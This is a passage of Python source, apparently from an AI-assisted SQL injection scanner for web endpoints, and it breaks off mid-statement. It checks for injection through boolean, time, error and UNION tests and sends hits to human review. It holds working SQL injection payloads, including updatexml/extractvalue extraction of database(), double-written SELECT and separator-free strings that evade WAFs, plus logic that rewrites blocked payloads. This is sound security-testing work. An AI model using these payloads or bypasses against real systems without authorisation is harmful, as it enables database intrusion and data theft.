# -*- coding: utf-8 -*-
"""AI Payload 精细化试探：低并发、限速、判据验证、误报控制。

误报控制四重闸门：
  ① 误报库前置检索（研判阶段已做）
  ② 每个 payload 必须满足"预期判据"才算命中（布尔差异/时延阈值/报错特征）
  ③ 单接口 ≥2 个不同向量一致命中才产出漏洞（DBMS 专属强报错 / UNION 回显可单向量确认）
  ④ 命中样本一律 pending_review 进人工复核，绝不直接定级

判据设计（2026-10-14 优化，替代旧的字节级全等判据）：
  - 布尔：true/false 必须由生成端配对提供（逐字符同构只差真假条件）；
    命中条件 = true/false 显著不同（状态码或长度），且 true 为正常结果页（比 false 内容多）
    或 true 恰好还原基线响应。旧判据要求 true 与基线 sha256 全等，页面任何动态内容都会杀死它。
  - 报错：关键词命中且**基线响应中不含该关键词**（排除页面常态报错干扰）。
  - 强证据：DBMS 专属报错（unrecognized token / sqlite / sql syntax 等）或 UNION 版本回显，
    单向量即可确认；generic 关键词（near / LIKE 混文本）不算强证据。
  - 时延：扣除实测基线耗时，避免把网络开销算进注入时延。
"""
import hashlib
import re
import time
from urllib.parse import urlencode, urlsplit, parse_qsl, urlunsplit, unquote

from sqlalchemy.orm import Session

from app.models.endpoint import Endpoint
from app.services import ai
from app.services.event_bus import bus
from app.services.safety import SafeHttpClient

_ERROR_KEYWORDS = (r"you have an error in your sql syntax", r"warning:\s+mysql",
                   r"unclosed quotation mark", r"quoted string not properly terminated",
                   r"odbc.*error", r"ora-\d{5}", r"psql.*error", r"sqlite3?\.",
                   r"microsoft.*odbc", r"sql syntax", r"syntax error at or near",
                   r"unrecognized token",
                   # 同样不收 LIKE '%（回显型靶机的正常页里天然含它，会全员误报）
                   r"sql logic error", r"查询异常", r"near\s+",
                   r"result columns")

# 引号破坏型 parse error：只能说明「原查询被引号弄坏了」，不能说明注入被执行。
# 2026-10-19 49920 实测：WAF 拒绝页就写「查询异常: near "x": syntax error」/
# `unrecognized token: "'"`，任何带引号的 payload 都会触发——它不是注入证据。
# 这类命中只作为弱证据落 hits（交人工），不计入 vectors_hit，不参与确认。
_PARSE_ERROR_KEYWORDS = (
    r"you have an error in your sql syntax",
    r"sql syntax", r"syntax error at or near", r"unrecognized token",
    r"near\s+", r"查询异常",
    r"unclosed quotation mark", r"quoted string not properly terminated",
    r"sql logic error",
)

# DBMS 专属强报错：命中即可单向量确认（parse error / generic 特征不算）
_STRONG_ERROR_KEYWORDS = (
    r"warning:\s+mysql",
    r"odbc.*error", r"ora-\d{5}", r"psql.*error", r"sqlite3?\.",
    r"microsoft.*odbc", r"result columns",
)


# 无分隔符（零空格/零注释）布尔对：过滤空格、+、/**/、注释符时唯一可活的形态。
# 例如 `zhangsan'and(1=1)and'1'='1`：括号分隔 + 逻辑闭合原语，尾部交给原语句的引号闭合。
_NOSEP_BOOL_TEMPLATES = (
    ("{v}'and(1=1)and'1'='1", "{v}'and(1=2)and'1'='1"),
    ("{v}'&&(1=1)&&'1'='1", "{v}'&&(1=2)&&'1'='1"),
    # 十六进制比较（0x31='1'）：数字/引号被过滤时的等价形态
    ("{v}'and(0x31=0x31)and'1'='1", "{v}'and(0x31=0x32)and'1'='1"),
)

# 错误型家族（回显数据 → 强证据）。updatexml/extractvalue 不依赖 SELECT；
# exp/geometrycollection 走子查询（SELECT 被过滤时不生效，但保留给普通目标）。
_NOSEP_ERROR_TEMPLATES = (
    # 靶场还会过滤 `and`（某靶场 实测），`&&` 可存活 → 优先尝试
    "{v}'&&(updatexml(1,concat(0x7e,database(),0x7e),1))&&'1'='1",
    "{v}'&&(extractvalue(1,concat(0x7e,database())))&&'1'='1",
    "{v}'and(updatexml(1,concat(0x7e,database(),0x7e),1))and'1'='1",
    "{v}'and(extractvalue(1,concat(0x7e,database())))and'1'='1",
    # SELECT 双写（过滤器删一次后还原）+ 括号分隔（本类靶场空格被过滤）
    "{v}'and(exp(~(sselectelect*from(sselectelect(database())a))))and'1'='1",
    "{v}'and(geometrycollection((sselectelect*from(sselectelect(database())a))))and'1'='1",
)

_ECHO_RE = re.compile(r"~([^~<>\s]{1,80})~")


_CONFIRMED_FLIPS = (
    ("(1=1)", "(1=2)"),
    ("0x31=0x31", "0x31=0x32"),
    ("1=1", "1=2"),
    ("'1'='1", "'1'='2"),
)


def _flip_confirmed(payload: str) -> str | None:
    """把人工确认 payload 的条件翻转成同构假值（只翻第一处），用于受控对照。"""
    for a, b in _CONFIRMED_FLIPS:
        if a in payload:
            return payload.replace(a, b, 1)
    return None


def _error_echo_hit(text: str, payload: str, base_text: str) -> str | None:
    """错误型 payload 的回显数据（`~db~`）→ 强证据。

    updatexml/extractvalue 会把 `concat(0x7e, database(), 0x7e)` 的内容打进报错，
    例如 `XPATH syntax error: '~sql_injection_lab~'`。基线里没有该片段即视为注入证据。
    """
    if not re.search(r"updatexml|extractvalue|\bexp\s*\(|geometrycollection|linestring|polygon",
                     payload or "", re.I):
        return None
    m = _ECHO_RE.search(text or "")
    if m and m.group(1) not in (base_text or ""):
        return m.group(1)
    return None


def _is_parse_error(kw: str) -> bool:
    """引号破坏型 parse error → 弱证据。"""
    return kw in _PARSE_ERROR_KEYWORDS


def _quote_parity_ok(e1: str | None, e2: str | None, base_text: str) -> bool:
    """单引号报错、双单引号不报错、且基线无该报错 → 引号奇偶命中。"""
    return bool(e1 and not e2 and not re.search(e1, base_text or "", re.I))


def _quote_parity_probe(client, endpoint, param: str, base_value: str,
                        base_text: str) -> dict | None:
    """确定性引号奇偶对照：单引号报错、双单引号不报错 → 字符串型注入。

    只发 2 个请求，判据与研判探针的 quote_parity 一致；不依赖 AI payload。
    """
    try:
        url1, p1, d1 = _build_request(endpoint, param, f"{base_value}'")
        r1 = client.request(endpoint.method, url1, params=p1, data=d1,
                            payload=f"{base_value}'")
        url2, p2, d2 = _build_request(endpoint, param, f"{base_value}''")
        r2 = client.request(endpoint.method, url2, params=p2, data=d2,
                            payload=f"{base_value}''")
    except Exception:
        return None
    e1 = _match_error_keyword(r1.text or "")
    e2 = _match_error_keyword(r2.text or "")
    if _quote_parity_ok(e1, e2, base_text):
        return {"payload": f"{base_value}'", "vector": "error",
                "criteria": (f"引号奇偶法：单引号触发 {e1}，双单引号不触发"
                             "（引号数量控制解析）"),
                "matched_keyword": "quote_parity", "elapsed_ms": 0}
    return None


def _weak_error_is_revealed(kw: str, original_payload: str | None,
                            silent_payloads: set[str],
                            attempts: list[dict] | None = None) -> bool:
    """弱报错是否由「绕过揭示」升级：普通形态被静默过滤，绕过形态才报错。

    对照实验本身就是证据：同一个 payload 去掉绕过写法后与基线完全一致（被吃掉），
    加上绕过写法后 SQL 才报错 → 报错是注入控制权的表现，而不是引号碰巧破坏了查询。
    """
    if not _is_parse_error(kw):
        return False
    if original_payload and original_payload in silent_payloads:
        return True
    return any("疑被过滤" in str(a.get("outcome") or "")
               for a in (attempts or []))


def _page_key(resp) -> tuple:
    """响应结构键：状态码 + 正文哈希。"""
    return resp.status_code, hashlib.sha256(resp.content).hexdigest()[:16]


def _content_similar(a, b) -> bool:
    """结构相似：状态码一致 + 正文长度接近（容忍动态内容，不做字节级全等）。"""
    if a.status_code != b.status_code:
        return False
    la, lb = len(a.content or b""), len(b.content or b"")
    return abs(la - lb) <= max(120, 0.1 * max(la, lb))


# UNION 判据专用：**只有**这类「语义错误」能证明 UNION 真的被执行了（列数不匹配等）。
# 泛化的 `you have an error in your sql syntax` 是**解析错误**，只说明引号破坏了原查询
# ——那恰恰是「语境不匹配」的症状，不是 UNION 成功的证据。
# 实测（2026-10-15 Less-13）：靶场是 `username=('$v')` 的 `')` 语境，探针发了 `1' union…`
# → 括号不配平 → 解析错误，却被记为「UNION 触发报错（语句已被执行）」并据此确认漏洞；
# 随后深入利用时 sqlmap 判「不可注入」，前后自相矛盾。
_UNION_ERROR_KEYWORDS = (
    r"different number of columns",          # MySQL 1222
    r"different number of result columns",   # SQLite
    r"same number of columns",               # PostgreSQL
    r"each union query must have",           # PostgreSQL 另一种措辞
    r"equal number of expressions",          # SQL Server
    r"result columns",                       # 通用兜底
)


def _match_error_keyword(text: str, keywords: tuple | None = None) -> str | None:
    """返回命中的报错特征正则（未命中返回 None），供强证据判定复用。

    keywords：可传入更严的集合（UNION 判据用 `_UNION_ERROR_KEYWORDS`）。
    先过 ai.classify_db_error 的负向判据：命中应用层报错（强类型转换 / JSON 解析错）
    直接返回 None——这类报错数据库没见过畸形语句，不是注入。
    """
    head = (text or "")[:5000]
    _pos, neg = ai.classify_db_error(head)
    if neg:
        return None
    for kw in (keywords or _ERROR_KEYWORDS):
        if re.search(kw, head, re.IGNORECASE):
            return kw
    return None


# 疑似可拼接参数名（优先做注入参数）
_PREFERRED_PARAM_NAMES = ("id", "uid", "cid", "itemid", "item_id", "nid", "sid",
                          "q", "kw", "keyword", "search", "sort", "order", "type",
                          # 表单类接口：用户输入字段优先于 action/submit 这类控制字段
                          "username", "user", "name", "email", "account", "login",
                          "pass", "pwd", "content", "comment", "text", "title")

# 控制参数：探测时必须保留样例值（置空会让查询根本不执行）。
# 2026-10-23 某靶场：action=test 被置空 → 所有 payload 打在空气上。
_CONTROL_PARAM_NAMES = ("action", "method", "op", "do", "cmd", "submit", "event",
                        "csrf", "_token", "token", "nonce")


def pick_target_param(params: list[dict]) -> str | None:
    """选注入参数：优先疑似拼接参数，其次第一个参数。"""
    for p in params or []:
        if (p.get("name") or "").lower() in _PREFERRED_PARAM_NAMES:
            return p["name"]
    return params[0]["name"] if params else None


# 探针里可视为"这个参数可疑"的命中标记
_SUSPECT_MATCHED = ("quote_parity", "bypass_error", "bypass_bool_diff")


def _suspect_siblings(probes: list[dict], target_param: str | None) -> list[str]:
    """探针里**被探参数之外**出现 SQL 报错 / 绕过证据的参数名。

    2026-10-15 追加轮·收紧门控：这是兄弟参数兜底轮的**唯一触发条件**——
    探针全干净就补探，等于多参数接口普遍白跑一轮（smoke_1 实测 >160s 顶穿 60s 预算）。
    """
    out: list[str] = []
    for pr in probes or []:
        nm = pr.get("param")
        if not nm or nm == target_param or nm in out:
            continue
        if pr.get("sql_error_like") or pr.get("matched") in _SUSPECT_MATCHED:
            out.append(nm)
    return out


def probe_endpoint(db: Session, endpoint: Endpoint, waf_profile, safe_client: SafeHttpClient,
                   scan_config: dict, sqlmap_output: str | None = None,
                   focus_param: str | None = None) -> dict:
    """对单个接口执行 AI Payload 试探。

    focus_param：强制指定注入参数（兄弟参数兜底轮用）；缺省按启发式选。
    返回 {result_class, target_param, hits: [{payload, vector, criteria, elapsed_ms}], tried: int}
    result_class ∈ vuln_confirmed / no_vuln / waf_blocked / inconclusive / error
    """
    strategies = scan_config.get("bypass_strategies")
    params = endpoint.params or []
    # 选注入参数：显式 focus 优先（兄弟参数兜底轮），否则走启发式
    target_param = focus_param or pick_target_param(params)
    # 先采探针证据，让 payload 生成模仿当前报错语境（如 SQLite unrecognized token）
    probes = ai._collect_sqli_probes(endpoint)
    probe_ctx = {"probes": probes}
    # 兄弟参数线索（2026-10-15 追加轮·**收紧门控**）：
    # 探针已覆盖最多 3 个参数；只有**被探参数之外**的某参数出现 SQL 报错 / 绕过证据时，
    # 它才值得再补一轮。探针全干净就**不补**——否则多参数接口普遍白跑一整轮，
    # 流水线耗时翻倍（smoke_1 实测 >160s 顶穿 60s 预算）。
    suspect_siblings = _suspect_siblings(probes, target_param)
    if not target_param:
        return {"result_class": "no_vuln", "hits": [], "tried": 0, "target_param": None,
                "probe_hint": suspect_siblings}

    # 研判探针已经拿到 UNION 回显 marker：这是强证据，直接确认，不必再等慢目标上的
    # sqlmap 布尔测试跑完（搜索框类接口常见）。
    union_hit = next((p for p in probes if p.get("matched") == "union_echo"
                      and p.get("payload") and p.get("param") == target_param), None)
    if not union_hit:
        union_hit = next((p for p in probes if p.get("matched") == "union_echo"
                          and p.get("payload")), None)
    if union_hit:
        return {
            "result_class": "vuln_confirmed",
            "hits": [{"payload": union_hit["payload"], "vector": "union",
                      "criteria": f"UNION 回显 marker 命中（{union_hit.get('columns')} 列）",
                      "elapsed_ms": 0}],
            "tried": 1,
            "target_param": union_hit.get("param") or target_param,
            "probe_hint": suspect_siblings,
        }

    base_value = next((p.get("sample_value") for p in params
                       if p["name"] == target_param and p.get("sample_value")), "1")

    payloads = ai.generate_payloads(db, endpoint, waf_profile, strategies=strategies,
                                    probe_context=probe_ctx, base_value=base_value)
    if not payloads:
        return {"result_class": "inconclusive", "hits": [], "tried": 0,
                "target_param": target_param, "probe_hint": suspect_siblings}

    # 基线响应（耗时取 safe_client.last_elapsed：纯 HTTP 往返，不含本工具限速等待）
    base_url, base_params, base_data = _build_request(endpoint, target_param, base_value)
    try:
        baseline = safe_client.request(endpoint.method, base_url, params=base_params,
                                       data=base_data, audit=False)
        base_elapsed = _elapsed(safe_client)
    except Exception as exc:
        bus.publish("scan", f"[ai_probe] 基线请求失败 {endpoint.path}: {exc}", level="warn")
        return {"result_class": "error", "hits": [], "tried": 0, "target_param": target_param,
                "probe_hint": suspect_siblings}
    base_key = _page_key(baseline)
    base_text = (baseline.text or "")[:5000]

    hits, tried = [], 0
    vectors_hit: set = set()
    blocked_count = 0
    silent_count = 0          # payload 含被过滤字符却与基线完全一致 → 疑静默过滤
    silent_payloads: set[str] = set()   # 被静默过滤的原始 payload（绕过揭示的对照组）
    attempts: list[dict] = []  # 反馈环：实际发了什么、结果如何，回喂 AI 改写

    # 引号奇偶法（确定性对照，先于 AI payload）：
    # `1'` 报错而 `1''` 不报错 → 引号数量控制了解析，字符串型注入强证据。
    # 这是「条件可控佐证」，不是单次 parse error；49920 那种两种引号都报错的
    # 引号破坏型目标不会命中。
    parity = _quote_parity_probe(safe_client, endpoint, target_param,
                                 base_value, base_text)
    if parity:
        hits.append(parity)
        vectors_hit.add("error")
        tried += 2

    # ---- 人工确认 payload 优先复测（2026-10-23）----
    # 过滤型靶场的可用形态往往不在内置字典里：分析员手工验证成功后录入，
    # 这里用它做「原样 + 受控假值」复测，回显 (updatexml ~data~) 直接作为强证据。
    try:
        from app.models.confirmed import ConfirmedPayload
        _confirmed = (db.query(ConfirmedPayload)
                      .filter(ConfirmedPayload.endpoint_id == endpoint.id)
                      .order_by(ConfirmedPayload.id.desc()).limit(3).all())
    except Exception:
        _confirmed = []
    for cp in _confirmed:
        pe = cp.payload
        # 注入参数：录入时指定优先；否则逐个参数试（多参数接口不能只赌一个）。
        _cp_params = ([cp.param] if getattr(cp, "param", None) else
                      [x["name"] for x in (endpoint.params or []) if x.get("name")] or
                      [target_param])
        for _tp in _cp_params:
            if not _tp:
                continue
            _hit, _reqs = _probe_confirmed_payload(safe_client, endpoint, _tp, pe,
                                                   base_key, base_text)
            tried += _reqs
            if _hit:
                hits.append(_hit)
                vectors_hit.add(_hit["vector"])
                break
        if any(str(h.get("criteria", "")).startswith("人工确认") for h in hits):
            break

    work = list(payloads)
    rewrite_budget = [2]          # 现场反推最多改写 2 次，防止无限重试

    def _maybe_rewrite(sent_payload: str, resp_text: str, vector_name: str,
                       false_variant: str | None = None):
        """边看报错边改：从回显 SQL 推断 WAF 变换，改写后追加到待发队列。"""
        if rewrite_budget[0] <= 0 or not resp_text:
            return
        from app.services.waf_learn import infer_and_rewrite, rewrite
        new_payload, transforms = infer_and_rewrite(sent_payload, resp_text)
        if not new_payload or any(w.get("payload") == new_payload for w in work):
            return
        rewrite_budget[0] -= 1
        work.append({
            "payload": new_payload,
            "vector": vector_name,
            "false_variant": (rewrite(false_variant, transforms) if false_variant else None),
            "expected_criteria": "现场反推改写（WAF 变换）",
        })
        bus.publish("scan", f"[ai_probe] 报错反推 WAF 变换 {transforms} → 改写 payload: "
                            f"{new_payload[:100]}")

    idx = 0
    while idx < len(work):
        p = work[idx]
        idx += 1
        payload = p["payload"]
        vector = p.get("vector", "boolean")

        # ---- 布尔：true / false 成对验证（生成端必须提供同构 false 变体） ----
        if vector == "boolean":
            false_payload = p.get("false_variant") or _false_variant(payload)
            if not false_payload or false_payload == payload:
                # 没有同构 false 变体则对照无意义：true/false 相同响应恒不命中，跳过省请求
                bus.publish("scan", f"[ai_probe] 布尔 payload 缺同构 false 变体，跳过: "
                                    f"{payload[:50]}", level="warn")
                continue
            true_url, true_params, true_data = _build_request(endpoint, target_param, payload)
            false_url, false_params, false_data = _build_request(endpoint, target_param,
                                                                false_payload)
            try:
                r_true = safe_client.request(endpoint.method, true_url, params=true_params,
                                             data=true_data, payload=payload)
                t_true = _elapsed(safe_client)
                r_false = safe_client.request(endpoint.method, false_url, params=false_params,
                                              data=false_data, payload=false_payload)
                t_false = _elapsed(safe_client)
            except Exception as exc:
                bus.publish("scan", f"[ai_probe] 请求异常 {endpoint.path}: {exc}", level="warn")
                continue
            tried += 2
            if _is_waf_block(r_true) or _is_waf_block(r_false):
                blocked_count += 1
                continue
            # 普通形态被静默吃掉：记录对照组，供绕过变体的弱报错升级为「绕过揭示」
            if _is_silently_filtered(r_true, payload, base_key):
                silent_count += 1
                silent_payloads.add(payload)
            if _is_silently_filtered(r_false, false_payload, base_key):
                silent_count += 1
                silent_payloads.add(false_payload)
            # ---- 判据0（耗时维度，必须先于内容判据）----
            # 真值返回结果集、假值返回空集时，两者页面长度可能相同（都渲染同一骨架），
            # 但服务端处理耗时差数倍。只看内容会整条漏掉（16328 靶机实测 3.1s vs 0.16s）。
            # 双向判定（47887 补）：不等式对 sqlite_version()>'0'(76ms) vs <'0'(3084ms)
            # 40 倍差是真信号，但方向与"真值慢"相反——只认单向会整条漏掉。
            time_hit, time_criteria = _bool_time_hit(t_true, t_false)
            if time_hit:
                hits.append({"payload": payload, "vector": "boolean",
                             "criteria": time_criteria,
                             "elapsed_ms": int(max(t_true, t_false) * 1000)})
                vectors_hit.add("boolean")
                continue
            k_true, k_false = _page_key(r_true), _page_key(r_false)
            if k_true == k_false:
                _maybe_rewrite(payload, r_true.text or "", "boolean", false_payload)
                continue
            # 判据A（最强）：true 恰好还原基线响应，false 与之不同 → 受控布尔对。
            # 条件由我们控制、且 true 精确还原基线，等价于「注入控制布尔分支」，
            # 单向量即可确认（2026-10-24：demo 这类纯布尔靶不再依赖 sqlmap）。
            if k_true == base_key and k_false != base_key:
                hits.append({"payload": payload, "vector": "boolean",
                             "criteria": "受控布尔对：true注入=基线，false注入显著差异",
                             "controlled": True, "elapsed_ms": 0})
                vectors_hit.add("boolean")
                continue
            # 判据B（常规）：true/false 结构显著不同，true 为正常结果页（内容多于 false）
            true_err = _match_error_keyword(r_true.text or "")
            if true_err and not re.search(true_err, base_text, re.IGNORECASE):
                # true 变体触发报错：parse error 需有「普通形态被过滤」的对照才升级
                revealed = _weak_error_is_revealed(
                    true_err, payload, silent_payloads, attempts)
                weak = _is_parse_error(true_err) and not revealed
                hits.append({"payload": payload, "vector": "error",
                             "criteria": (f"布尔 true 变体绕过揭示 {true_err}"
                                          if revealed else
                                          f"布尔 true 变体触发报错特征 {true_err}（基线无）"),
                             "matched_keyword": true_err, "weak": weak, "elapsed_ms": 0})
                if not weak:
                    vectors_hit.add("error")
            elif not _content_similar(r_true, r_false) and \
                    len(r_true.content or b"") > len(r_false.content or b""):
                hits.append({"payload": payload, "vector": "boolean",
                             "criteria": (f"true/false 显著差异（{len(r_true.content)}B vs "
                                          f"{len(r_false.content)}B），true 为正常结果页"),
                             "elapsed_ms": 0})
                vectors_hit.add("boolean")
            else:
                _maybe_rewrite(payload, r_true.text or "", "boolean", false_payload)

        # ---- 时间：时延阈值（扣除实测基线耗时） ----
        elif vector == "time":
            delay = _extract_delay(payload, scan_config.get("time_based_max_delay_s", 5))
            false_payload = p.get("false_variant")
            url, req_params, req_data = _build_request(endpoint, target_param, payload)
            try:
                resp = safe_client.request(endpoint.method, url, params=req_params,
                                           data=req_data, payload=payload)
                elapsed = _elapsed(safe_client)
            except Exception:
                continue
            tried += 1
            if _is_waf_block(resp):
                blocked_count += 1
                continue
            if false_payload:
                # 受控成对：真值应休眠、假值应≈基线。单次 sleep 命中会被慢目标/抖动
                # 误伤（限流靶机会把任意请求拖慢）；有对照组才能作为强证据单向量确认。
                f_url, f_params, f_data = _build_request(endpoint, target_param, false_payload)
                try:
                    resp_f = safe_client.request(endpoint.method, f_url, params=f_params,
                                                 data=f_data, payload=false_payload)
                    fast = _elapsed(safe_client)
                except Exception:
                    continue
                tried += 1
                if _is_waf_block(resp_f):
                    blocked_count += 1
                    continue
                hit, criteria = _controlled_time_hit(elapsed, fast, delay)
                if hit:
                    hits.append({"payload": payload, "vector": "time",
                                 "criteria": criteria, "controlled": True,
                                 "elapsed_ms": int(elapsed * 1000)})
                    vectors_hit.add("time")
                else:
                    _maybe_rewrite(payload, resp.text or "", "time", false_payload)
            elif elapsed - base_elapsed >= delay * 0.8 and elapsed >= 2.0:
                hits.append({"payload": payload, "vector": "time",
                             "criteria": f"时延 {elapsed:.1f}s ≥ 阈值 {delay * 0.8:.1f}s"
                                         f"（基线 {base_elapsed:.1f}s 已扣除）",
                             "elapsed_ms": int(elapsed * 1000)})
                vectors_hit.add("time")
            else:
                _maybe_rewrite(payload, resp.text or "", "time")

        # ---- 报错：回显特征，且必须基线中没有该特征 ----
        elif vector == "error":
            url, req_params, req_data = _build_request(endpoint, target_param, payload)
            try:
                resp = safe_client.request(endpoint.method, url, params=req_params,
                                           data=req_data, payload=payload)
            except Exception:
                continue
            tried += 1
            if _is_waf_block(resp):
                blocked_count += 1
                continue
            kw = _match_error_keyword(resp.text or "")
            if kw and not re.search(kw, base_text, re.IGNORECASE):
                weak = _is_parse_error(kw)
                hits.append({"payload": payload, "vector": "error",
                             "criteria": (f"弱报错（引号破坏型 parse error）{kw}"
                                          if weak else f"命中报错特征 {kw}（基线无此特征）"),
                             "matched_keyword": kw, "weak": weak, "elapsed_ms": 0})
                if not weak:
                    vectors_hit.add("error")
            else:
                # 报错页可能回显实际执行 SQL → 反推 WAF 变换并改写重试
                _maybe_rewrite(payload, resp.text or "", "error")
                if _is_silently_filtered(resp, payload, base_key):
                    silent_count += 1
                    silent_payloads.add(payload)
                    attempts.append({"payload": payload, "outcome":
                                     "无变化（疑被过滤）", "len": len(resp.content)})
                else:
                    attempts.append({"payload": payload, "outcome":
                                     "无报错无差异", "len": len(resp.content)})

        # ---- UNION：版本回显 / UNION 专属报错（列数不匹配同样证明语句被执行） ----
        elif vector == "union":
            url, req_params, req_data = _build_request(endpoint, target_param, payload)
            try:
                resp = safe_client.request(endpoint.method, url, params=req_params,
                                           data=req_data, payload=payload)
            except Exception:
                continue
            tried += 1
            if _is_waf_block(resp):
                blocked_count += 1
                continue
            text = (resp.text or "")[:5000]
            m = re.search(r"\b\d+\.\d+\.\d+\b", text)
            if m and m.group(0) not in base_text:
                hits.append({"payload": payload, "vector": "union",
                             "criteria": f"UNION 回显版本号 {m.group(0)}",
                             "version_echo": m.group(0), "elapsed_ms": 0})
                vectors_hit.add("union")
                continue
            # SQLite 取库表：sqlite_master.sql 列回显「CREATE TABLE …」→ 强证据
            if "create table" in text.lower() and "create table" not in base_text.lower():
                hits.append({"payload": payload, "vector": "union",
                             "criteria": "UNION 回显 sqlite_master 建表语句（CREATE TABLE）",
                             "elapsed_ms": 0})
                vectors_hit.add("union")
                continue
            # 通用：UNION 回显了基线没有的新片段（表名/字段值），且响应明显变长
            if len(text) > len(base_text) + 200 and _has_new_token(text, base_text):
                hits.append({"payload": payload, "vector": "union",
                             "criteria": "UNION 回显基线没有的新内容（疑似表名/字段值）",
                             "elapsed_ms": 0})
                vectors_hit.add("union")
                continue
            kw = _match_error_keyword(text, _UNION_ERROR_KEYWORDS)
            if kw and not re.search(kw, base_text, re.IGNORECASE):
                hits.append({"payload": payload, "vector": "union",
                             "criteria": f"UNION 列数不匹配报错 {kw}（语句已被执行）",
                             "matched_keyword": kw, "elapsed_ms": 0})
                vectors_hit.add("union")
            elif _is_silently_filtered(resp, payload, base_key):
                silent_count += 1
                silent_payloads.add(payload)
            else:
                _maybe_rewrite(payload, text, "union")

        # ---- 无分隔符确定性探针（2026-10-23 某靶场）----
    # 靶场过滤「空格 / + / /**/ / 注释符 / UNION / SELECT」。常规与绕过变体全部失效，
    # 唯一能活的是「零空格零注释、括号分隔、逻辑闭合」：`'and(...)and'1'='1`。
    # 只在主流程毫无命中时执行，避免给正常目标增加请求。
    # 只要还没有「回显型/受控」强证据就跑（引号奇偶、弱 parse error 不算）：
    # 31947 实测引号奇偶先命中，若条件写成 `not hits` 会整段跳过零分隔家族。
    if tried > 0 and not any(h.get("version_echo") or h.get("controlled") for h in hits):
        for true_tpl, false_tpl in _NOSEP_BOOL_TEMPLATES:
            pt = true_tpl.format(v=base_value)
            pf = false_tpl.format(v=base_value)
            try:
                ut, rpt, rdt = _build_request(endpoint, target_param, pt)
                r_true = safe_client.request(endpoint.method, ut, params=rpt, data=rdt,
                                             payload=pt)
                t_true = _elapsed(safe_client)
                uf, rpf, rdf = _build_request(endpoint, target_param, pf)
                r_false = safe_client.request(endpoint.method, uf, params=rpf, data=rdf,
                                              payload=pf)
                t_false = _elapsed(safe_client)
            except Exception:
                continue
            tried += 2
            if _is_waf_block(r_true) or _is_waf_block(r_false):
                blocked_count += 1
                continue
            time_hit, time_criteria = _bool_time_hit(t_true, t_false)
            if time_hit:
                hits.append({"payload": pt, "vector": "boolean",
                             "criteria": f"无分隔符布尔对·{time_criteria}",
                             "elapsed_ms": int(max(t_true, t_false) * 1000)})
                vectors_hit.add("boolean")
                break
            k_true, k_false = _page_key(r_true), _page_key(r_false)
            if k_true != k_false and k_true == base_key:
                hits.append({"payload": pt, "vector": "boolean",
                             "criteria": ("受控布尔对（无分隔符）：true=基线，"
                                          f"false 不同（{len(r_true.content)}B vs "
                                          f"{len(r_false.content)}B）"),
                             "controlled": True, "elapsed_ms": 0})
                vectors_hit.add("boolean")
                break
            if k_true != k_false and \
                    len(r_true.content or b"") > len(r_false.content or b""):
                hits.append({"payload": pt, "vector": "boolean",
                             "criteria": ("无分隔符布尔对：true/false 响应结构不同"
                                          f"（{len(r_true.content)}B vs {len(r_false.content)}B）"),
                             "elapsed_ms": 0})
                vectors_hit.add("boolean")
                break

        for tpl in _NOSEP_ERROR_TEMPLATES:
            pe = tpl.format(v=base_value)
            url, rp_, rd_ = _build_request(endpoint, target_param, pe)
            try:
                resp = safe_client.request(endpoint.method, url, params=rp_, data=rd_,
                                           payload=pe)
            except Exception:
                continue
            tried += 1
            if _is_waf_block(resp):
                blocked_count += 1
                continue
            text = (resp.text or "")[:8000]
            echo = _error_echo_hit(text, pe, base_text)
            if echo:
                hits.append({"payload": pe, "vector": "error",
                             "criteria": f"无分隔符报错回显 {echo}", "version_echo": echo,
                             "elapsed_ms": 0})
                vectors_hit.add("error")
                break
            kw = _match_error_keyword(text)
            if kw and not re.search(kw, base_text, re.IGNORECASE):
                hits.append({"payload": pe, "vector": "error",
                             "criteria": f"无分隔符报错特征 {kw}（基线无）",
                             "matched_keyword": kw, "elapsed_ms": 0})
                vectors_hit.add("error")
                break

    # ---- 绕过重试：WAF 静默过滤（不返回拦截页，只是 payload 不生效）----
    # 靶机特征：过滤空格 + 单次关键字过滤 → 常规 payload 发出后毫无反应。
    # 对每个 payload 生成「空格替代 + 关键字双写」变体重试，判据同主流程。
    if not hits and tried > 0 and payloads:
        for p in payloads[:3]:
            for variant in ai.bypass_variants(p["payload"])[:6]:
                url, req_params, req_data = _build_request(endpoint, target_param, variant)
                try:
                    resp = safe_client.request(endpoint.method, url, params=req_params,
                                               data=req_data, payload=variant)
                except Exception:
                    continue
                tried += 1
                if _is_waf_block(resp):
                    blocked_count += 1
                    continue
                text = (resp.text or "")[:5000]
                kw = _match_error_keyword(text)
                if kw and not re.search(kw, base_text, re.IGNORECASE):
                    revealed = _weak_error_is_revealed(
                        kw, p.get("payload"), silent_payloads, attempts)
                    weak = _is_parse_error(kw) and not revealed
                    criteria = (f"绕过揭示：普通形态被静默过滤，绕过变体触发 {kw}"
                                if revealed else
                                (f"绕过变体触发弱报错 {kw}（基线无）" if weak
                                 else f"绕过变体触发报错 {kw}（基线无）"))
                    hits.append({"payload": variant, "vector": "error",
                                 "criteria": criteria, "matched_keyword": kw,
                                 "weak": weak, "elapsed_ms": 0})
                    if not weak:
                        vectors_hit.add("error")
                    break
                if "create table" in text.lower() and "create table" not in base_text.lower():
                    hits.append({"payload": variant, "vector": "union",
                                 "criteria": "绕过变体 UNION 回显 sqlite_master 建表语句（CREATE TABLE）",
                                 "elapsed_ms": 0})
                    vectors_hit.add("union")
                    break
                mv = re.search(r"\b\d+\.\d+\.\d+\b", text)
                if mv and mv.group(0) not in base_text:
                    hits.append({"payload": variant, "vector": "union",
                                 "criteria": f"绕过变体回显版本号 {mv.group(0)}",
                                 "version_echo": mv.group(0), "elapsed_ms": 0})
                    vectors_hit.add("union")
                    break
            if "union" in vectors_hit or "error" in vectors_hit:
                break

    # ---- 应用层过滤画像（2026-10-22）：常规 + 绕过变体都无反应时，
    #      用**单变量探针**区分「参数没进 SQL」还是「token 被删/替换」。
    #      硬预算 8 个请求，只在失败路径执行；只有出现 SQL 报错才计为命中，
    #      单纯长度差不算（避免把页面渲染差异当证据）。----
    # 只在**确实出现过静默过滤迹象**时画像：普通目标（无过滤）不额外发 8 个请求，
    # 避免拖慢整条流水线（smoke_2 90s 终态预算实测）。
    if not hits and tried > 0 and silent_count > 0:
        try:
            from app.services.filter_profile import profile_filters
            _prof = profile_filters(safe_client, endpoint, target_param,
                                    str(base_key or "1"), budget=8)
            tried += int(_prof.get("requests") or 0)
            for row in _prof.get("rows") or []:
                attempts.append({"payload": f"[profile:{row.get('label')}]",
                                 "outcome": row.get("state"),
                                 "len": row.get("len")})
                if row.get("state") != "error":
                    continue
                hits.append({"payload": row.get("payload"), "vector": "error",
